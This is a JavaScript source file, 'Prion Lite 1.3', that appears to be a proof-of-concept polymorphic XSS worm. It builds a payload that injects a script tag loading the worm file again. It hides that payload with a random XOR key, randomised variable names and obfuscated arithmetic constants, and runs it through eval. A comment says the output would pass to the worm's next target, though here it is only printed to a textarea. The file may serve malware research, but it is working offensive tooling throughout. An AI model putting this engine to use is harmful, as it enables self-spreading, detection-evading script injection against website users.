/* Prion Lite 1.3 by John Leitch - john.leitch5@gmail.com */

var generatedVars = [ "if", "do", "break", "const", "continue", "delete", "export", "for", "function", "import", "in", "instanceOf", "label", "let", "new", "return", "switch", "this", "throw", "typeof", "var", "void", "while", "with", "yield"];

function random(min, max) {
    return Math.round((max - min) * Math.random() + min);
}

function randomizeArray(a) {
    var a2 = new Array();

    while (a.length > 0)
        a2.push(a.splice(random(0, a.length - 1), 1));

    return a2;
}

var varNameChars = '_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';


function genVarName() {
    var varName;

    do {
        var varLen = random(1, 4);

        varName = '';

        for (var i = 0; i < varLen; i++) {
            var r = random(0, varNameChars.length - 1);

            varName += varNameChars[r];
        }

    } while (varUsed(varName));

    //alert('name generated');

    return varName;
}

function varUsed(varName) {
    for (var i = 0; i < generatedVars.length; i++) {
        if (generatedVars[i] == varName) {
            return true;
        }
    }

    return false;
}

function transformInt(int, count) {

    var operators = ['+', '-', '*', '/'];

    var transformed = '';

    for (var i = 0; i < count; i++) {
        var type = random(0, 3);

        var integers = transformed.match(/-?[\d\.]+/g);

        if (integers != null) {
            for (var j = 0; j < integers.length; j++) {
                if (integers[j].indexOf('.') != -1) {
                    integers.splice(j, 1);
                    j--;
                    continue;
                }
            }

            if (integers.length == 0)
                break;
        }

        if (transformed != '') {
            var intStr = integers[random(0, integers.length - 1)];

            int = parseInt(intStr.match(/-?\d+/));
        }

        var split = '';

        switch (type) {
            case 0:
                var x = random(-1000, 1000);
                var y = int - x;
                split = '(' + x + '+' + y + ')';
                break;
            case 1:
                var y = random(0, 1000);
                var x = int + y;
                split = '(' + x + '- ' + y + ')';
                break;
            case 2:
                var y = random(-1000, 1000);
                var x = int / y;
                split = 'Math.round(' + x + '*' + y + ')';
                break;
            case 3:
                var y = random(-1000, 1000);
                var x = int * y;
                split = '(' + x + '/' + y + ')';
                break;
        }

        if (transformed != '') {
            var replaceRegex = new RegExp('([^\\d\\.]|^)' + int + '(([^\\d\\.])|$)');

            var oldTransformed = transformed;

            transformed = transformed.replace(replaceRegex, '$1' + split + '$2');
        }
        else {
            transformed = split;
        }
    }

    //alert('transformed int: ' + transformed)

    return transformed;
}

function encrypt(code) {
    var key =
    [
        Math.floor(Math.random() * 256),
        Math.floor(Math.random() * 256)
    ];

    var lastByteName = genVarName();
    var keyName = genVarName();
    var arrayName = genVarName();
    var decryptedName = genVarName();
    var counterName = genVarName();
    var charName = genVarName();

    var minTransform = 1;
    var maxTransform = 3;

    var minCharCode = transformInt(32, random(minTransform, maxTransform));
    var maxCharCode = transformInt(127, random(minTransform, maxTransform));

    var two = transformInt(2, random(minTransform, maxTransform));

    var blocks = new Array();

    blocks[0] = 'var ' + keyName + '=[' + key[0] + ',' + key[1] + '];';
    blocks[1] = 'var ' + arrayName + '=\'';

    var lastByte = 0;

    for (var i = 0; i < code.length; i++) {
        var c = code.charCodeAt(i);
        var c2 = (c ^ key[0] ^ key[1] ^ lastByte).toString(16);

        lastByte = c;

        blocks[1] += c2.length == 2 ? c2 : +'0' + c2;
    }

    blocks[1] += '\';';
    blocks[2] = 'var ' + decryptedName + '=\'\';';
    blocks[3] = 'var ' + lastByteName + '=0;';

    blocks = randomizeArray(blocks);

    var encrypted = blocks[0] + blocks[1] + blocks[2] + blocks[3] +
        'for(var ' + counterName + '=0;' + counterName +
            '<' + arrayName + '.length;' + counterName + '+=2){' +
            'var ' + charName + '=parseInt(' + arrayName + '[' + counterName + ']+' +
                arrayName + '[' + counterName + '+1],16)^' + keyName + '[0]^' + keyName + '[1]^' + lastByteName + ';' +
            lastByteName + '=' + charName + ';' +
            'if(' + charName + '==10||(' + charName + '>=' + minCharCode + '&&' + charName + '\x3c' + maxCharCode + '))' +
            '{' + decryptedName + '+=String.fromCharCode(' + charName + ');}' +
        '}' +

    //'alert(\'decrypted:\\r\\n\' + ' + decryptedName + ');' +

        'eval(' + decryptedName + ');';

    return encrypted;
}

var code = 'var s=document.createElement("script");' +
    's["src"]="PrionLite.js";' + 
    'document.body.appendChild(s);';

var encryptedCode = encrypt(code);

// This is where the newly obfuscated worm (stored in encoded)
// is passed on to it's next target. But because we don't have a target
// we'll spit the newly obfuscated code out to a textarea.

document.getElementById('xssWormLite13').innerHTML =
    encryptedCode.replace(/\x3c/g, '\x26lt;');